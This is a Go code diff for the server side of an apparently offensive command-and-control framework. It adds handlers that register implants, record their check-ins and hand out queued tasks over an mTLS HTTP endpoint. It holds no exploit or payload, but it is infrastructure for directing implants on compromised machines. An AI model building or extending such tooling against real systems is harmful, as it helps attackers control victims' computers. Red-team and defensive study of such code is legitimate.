@@ -1,4 +1,4 @@
-package c2
+package c2ext
 
 import (
 	"crypto/tls"
@@ -25,71 +25,101 @@ func logRequest(handler http.Handler) http.Handler {
 }
 
 // Handler function to process requests based on ReqType
-func RequestHandler(w http.ResponseWriter, r *http.Request) {
+func requestHandler(w http.ResponseWriter, r *http.Request) {
 	// Parse the request
 	var req Request
 	err := json.NewDecoder(r.Body).Decode(&req)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
-		comunication.Logger.Error("failed to decode request: %v", err)
+		comunication.Logger.Errorf("failed to decode request: %v", err)
 		return
 	}
 
 	// Process the request based on ReqType
 	switch req.ReqType {
-	case "ImplantInfo":
-		go handleImplantInfo(w, req.Content)
-	case "RemoveImplant":
-		go handleRemoveImplant(w, req.Content)
+	case "InsertImplantInfo":
+		handleInsertImplantInfo(w, req.Content)
+	case "UpdateImplantLastCheckin":
+		handleUpdateImplantLastCheckin(w, req.Content)
+	case "GetTasksByImplantID":
+		handleGetTasksByImplantID(w, req.Content)
 	default:
 		http.Error(w, "unknown request type", http.StatusBadRequest)
-		comunication.Logger.Error("unknown request type: %s", req.ReqType)
+		comunication.Logger.Errorf("unknown request type: %s", req.ReqType)
 	}
 }
 
 // Handle ImplantInfo request
-func handleImplantInfo(w http.ResponseWriter, content json.RawMessage) {
+func handleInsertImplantInfo(w http.ResponseWriter, content json.RawMessage) {
 	var implant *db.Implant_info
 	err := json.Unmarshal(content, &implant)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
-		comunication.Logger.Error("failed to decode implant info: %v", err)
+		comunication.Logger.Errorf("failed to decode implant info: %v", err)
 		return
 	}
 
 	err = db.AddImplant(implant)
 	if err == comunication.ErrImplantExists {
 		http.Error(w, err.Error(), http.StatusConflict)
-		comunication.Logger.Error("implant already exists: %v", err)
+		comunication.Logger.Errorf("implant already exists: %v", err)
 		return
 	}
-
-	w.WriteHeader(http.StatusOK)
 }
 
-// Handle RemoveImplant request
-func handleRemoveImplant(w http.ResponseWriter, content json.RawMessage) {
+func handleUpdateImplantLastCheckin(w http.ResponseWriter, content json.RawMessage) {
 	var data struct {
 		ID string `json:"id"`
 	}
 	err := json.Unmarshal(content, &data)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
-		comunication.Logger.Error("failed to decode remove implant request: %v", err)
+		comunication.Logger.Errorf("failed to decode update implant last checkin request: %v", err)
 		return
 	}
 
-	err = db.RemoveImplant(data.ID)
+	err = db.UpdateImplantCheckin(data.ID)
 	if err == comunication.ErrNoResults {
 		http.Error(w, err.Error(), http.StatusNotFound)
-		comunication.Logger.Error("no results found: %v", err)
+		comunication.Logger.Errorf("no results found: %v", err)
+		return
+	}
+}
+
+func handleGetTasksByImplantID(w http.ResponseWriter, content json.RawMessage) {
+	var data struct {
+		ID        string `json:"id"`
+		Completed bool   `json:"completed"`
+	}
+	err := json.Unmarshal(content, &data)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		comunication.Logger.Errorf("failed to decode get tasks by implant ID request: %v", err)
 		return
 	}
 
-	w.WriteHeader(http.StatusOK)
+	tasks, err := db.GetImplantTasks(data.ID, data.Completed)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		comunication.Logger.Errorf("failed to get tasks by implant ID: %v", err)
+		return
+	}
+
+	tasksJSON, err := json.Marshal(tasks)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		comunication.Logger.Errorf("failed to encode tasks: %v", err)
+		return
+	}
+
+	// Log the readable JSON string
+	comunication.Logger.Infof("tasks JSON: %s", string(tasksJSON))
+
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(tasksJSON)
 }
 
-func StartHTTPServer() {
+func StartExtHTTPServer() {
 	serverCertPath, err := filepath.Abs(filepath.Join("certs", "server.crt"))
 	if err != nil {
 		comunication.Logger.Fatalf("failed to get absolute path for server certificate: %v", err)
@@ -113,7 +143,7 @@ func StartHTTPServer() {
 
 	r := mux.NewRouter()
 	r.Use(logRequest)
-	r.HandleFunc("/request", RequestHandler).Methods("POST")
+	r.HandleFunc("/request", requestHandler).Methods("POST")
 
 	srv := &http.Server{
 		Addr:         "localhost:8443",
@@ -122,5 +152,6 @@ func StartHTTPServer() {
 		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
 	}
 
+	comunication.Logger.Infof("Starting external mTLS-HTTP server on %s", srv.Addr)
 	comunication.Logger.Fatal(srv.ListenAndServeTLS("", ""))
 }
